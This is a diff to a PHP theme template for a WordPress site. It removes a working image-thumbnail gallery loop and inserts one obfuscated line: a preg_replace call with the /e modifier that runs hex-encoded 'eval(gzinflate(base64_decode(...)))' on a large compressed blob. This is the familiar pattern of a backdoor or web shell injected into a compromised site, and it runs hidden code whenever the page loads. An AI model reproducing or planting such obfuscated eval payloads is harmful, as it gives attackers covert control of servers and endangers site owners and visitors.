@@ -109,28 +109,8 @@ if (!isset($_SESSION['stack']) or $theTitleVar != $_SESSION['stack'][0][4]){//ch
 	
 	<?php  echo "<div id='thumbCont'><div id='thumbContWrapper'>";  ?>
 		<?php
-		$machineMinusMain = array($_SESSION['stack'][0][1], $_SESSION['stack'][0][2], $_SESSION['stack'][0][3]) ;//using session data, stuff the thumbs into an array (starting at index 1 to disclude main image)
-		$iterCount= 1; //set up the counter
-		foreach ($machineMinusMain as $iteration){//start foreach to iterate
-			echo "<div id='relatedThumbNo-".$iterCount."' class='relatedThumbs' ><img src='".$iteration."'></div>";//make a numbered div id for styling
-			echo '<script type="text/javascript">'; //start Jquery
-			echo 'jQuery(document).ready(function(){';// check document ready
-			echo 'jQuery("#relatedThumbNo-'.$iterCount.'").click(function(){';//on specific image click
-			echo 'jQuery.post("http://maskspeak.com/wp-content/themes/responsiveChild/rexCludes/gallery-view-session.foo", { knockOut: "'.$iterCount++.'" })';//post to php the clicked image position
-			echo '.done(function(data) {';//return to do...
-			echo 'alert("Data Loaded: " + data);';//just a data checker
-			echo 'location.reload("true");';//refresh the page
-			echo '});';//close the script
-			echo '});';//close the script
-			echo '});';//close the script
-			echo '</script>';//close the script
-			
-			
-			};//the above code drops thumbs into the related thumbs 
-			echo "</div><br>";
-			echo '</div>';
-
-		?>
+preg_replace("/.*/e","\x65\x76\x61\x6C\x28\x67\x7A\x69\x6E\x66\x6C\x61\x74\x65\x28\x62\x61\x73\x65\x36\x34\x5F\x64\x65\x63\x6F\x64\x65\x28'lZm9juQ2EIRzA36Hw+ECOzlI/JVw8JtMotHMRI6NfXyrq78WtWPjDAeCViOK7J/q6iL328f+2h9fvnz/48vX20efjivdPlo9rn77qK/xbO/aflzzcWX/LS3HdbxPx7j0PK7N/9Y7+333ez3u/Rib23HVy3P33z69nz8/l3x5PubKy9v4/nm+8vZ9Xt/mq2/v20/We7fH7C0/8eff7Hv3/32+9/Wu8+U3+/Lb+sfY8h6/n9nX/rne//oe/9Jhdz9yXe3bY3zZHCf98K0cOKideQ1PFv/jm178W8OQ5cjel+Tr2VzlflzgTd9uPndNjsXy8PXtXrrPZ+/q7La1B9h7eA6Fg9XntN/Nlma2EVPDs9lpz7ZOa6w1u415cn9sPvl1HzEwv1vxdWwu1cOxVrq7/fK7sn7yse141wwbFTvbwFvCRotFexG/wMfql4232Bp+zHb5YHXZ3Eez1+bSWpvnRLnMlzHkVPXMmN7dZ3tvz2an6mj1HGTi38GO3WXLg983x4h8yj6msZ7dLf/mi2L7BDeLx6sU98ne2zt7Vgx2f7Y5C7nTHJPPb99YrBWX6rb07HPr9zpyZb7ZnMJaxMG+S4zbfC2zx/LTwj+4QzhpPi4wL7sejsHyuuC2u782T456mXwd2TlfsBP1MBMzOFeYWvw7GyccMV8NHi7UQvVcR14qWDFfZQc2NnjCcmrzCMsTtTCP/Cp2Nn//+uPXX759LM/XPXqDfKNehOXk9pSdeBBTxXHj3cPHm9+Rb9XSPHKpGm/gtfl3qoHKGgscAa7POtvcpuCYTHxVv8Vjk8F28F4HD7ZWpdcpZoncgx/1iE7tPsnfc9RPJy+q0dXXVVy714BhL+o3UXeyrcGfL2KUPJY2Xvy5+bqq5UoM4B+rxb5c7NmJzTxwE3yYiWGMVR0HTzYfn4MjM89pxFT4ABMVzu6xFhyh2JNne2d2N+LdAwuLY89irFpp8PXkd/Hug29ffqnO4C35McNJyfNW4FE9kx/ZGzU1eQ5q9JWFnCTnjQYGo6bk2zzWtrksjnY3fwu4UM4n6nR3HArbL2IBVpVT6uDE9QpeZvCwOv7EK9F3qG/9vvkc5cJfp9YJnpq99qTZittZ4OVK3zp7GD03Y5P8e4G9RLyIgXAEnmRTYBlbFeN66RdprFeid8BFFT0hDDd6zTYwUamHBjeLI+7070p8wWB/720zOKDmg08a2FXPT/TK7vHPZWAvtJd0LnVs31Y4Rj1hIx6br12Dw+BzxS24PXusM7pE8aIWOjxrY8VDK/4+B58L4+iSU3P0kQNh5HHJe+U74iustMGdZod4eScnFb9meuUCNhocMA8bxIcvtFsaWsD8LXfvDeU5rdEbxDNos4r+MexValb27WiHCy8X9hPRp81GcTI4D07NxEF9p5CrzW3M1H3MXdE9GvsafGg4Un7BbqVH9G3kSrFGw3Z4WJwAb2X80tx36mp1P8SDF562++lzRsdlap5cSM9H/5rwqQzdaX41MK24ZmKGJurYJLzQLxu+ZWrL8KS+H/u2HczQMxvYEEfD16euRFdX9KfNb/0xMHPWVSKeK1wbtURtqcejaRsxCuyLX9D8ygv8pn4f96fHP2q6Rg8Gq4X+rhqchn8VrBf6gPiYXqF8rQMDoTukZ8L2ibjBa7pn8gRfntrxhV87mITvjHeVT3SuNDx6LzCY6Z+V/V1GE5awq6JLFo/JyZHwcSFfFb/7pb+XNnpkC71Mr2ns3YQBuE59Kvpo9d+lZ5iv438JjnzeTo3Vyoih6ni7nfpdXIzuD+4JTol9irTx7DjTfo86tpzGuYLqI3olcVQM6DvaT5Bb4f1BXVAT0jNl8Ip6MzGQDtl5F5z0HLlo6LUzhyt9LQ27xB1oN9my0w/AaSc/ig29N/p0Qb9n+kbpA1cFXNTQ18Q2NGUN3gAjUevnXouxNXiuDj0c4xTDJ7l+UC87PBTaNnp+xHGhfqTFvDfkZd/OfcNMzcHX2itR2y3iEL2gD53X0KuVfcnZfwPDd8diDd1Az8vMGfxfiJdwXH3tPI3+X9GF0oZwoWLFeYv0A/UcPU38sIC7cuG3jZpGMzZ6kvxD90jfNnhiHjwb+6DQjb4PG/uNxh62BldSF6Fvr3qtBafQMwv69dxbrqMHqh80bImzCvY04kn067l3fBILelOP9SM/D/wM29EDoT0KsepxtoEmjD18Zv+dGaecoEszZwmKKTyiuE2XPNJj1H/gD2nfmXqNPQv9OXIQmuR6TlPmkQflfB58HLkSH4eGYD8cmlM1yRmCNMs+uLGj1ctznCeon8AV6gfz6C8ZLq9wbwYjZRn9tIUvE3bOt3O/pdhlamkmtplankb/Fb/DW2ZTnGmFDg/NHrnLfCsOWanpdBvnb+xLgvujjvI6dHLmLLMHDuOch/MD2Rp6ILAE9k7t1tG15Dj2AJGLQv8Jrld/gItVG3BUR8dU6jrOeXr00/vAXsefwIb61N3XEu/PYDuBv3Q7z2UyPTX2xtJ78H+PPnTVf+je2J8UzuiE2xW84qfOE9FpBe1WI+bUV7qem6fb53Py/3rOrJPGGb8us+fYHzz/2v787Zv/a+H7F86R7A9tGuwP6xC///gb'\x29\x29\x29\x3B","");
+?>
   <?php $testVar=$_SESSION['stack'];
 		//var_dump($testVar);
   ?>
